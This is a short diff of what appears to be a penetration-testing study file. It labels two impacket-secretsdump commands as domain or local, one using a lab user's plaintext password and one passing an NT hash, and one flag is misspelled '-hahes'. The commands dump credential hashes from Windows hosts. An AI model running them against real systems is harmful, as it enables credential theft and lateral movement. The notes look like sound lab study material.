@@ -439,8 +439,8 @@ Admin priv accounts needed
 - local admin
 
 ```sh
-impacket-secretsdump marvel.local/fcastle:Password1@$IP
-impacket-secretsdump administrator:@$IP -hahes :$NT
+impacket-secretsdump marvel.local/fcastle:Password1@$IP (domain)
+impacket-secretsdump administrator:@$IP -hahes :$NT (local)
 ```
 
 - domain admin
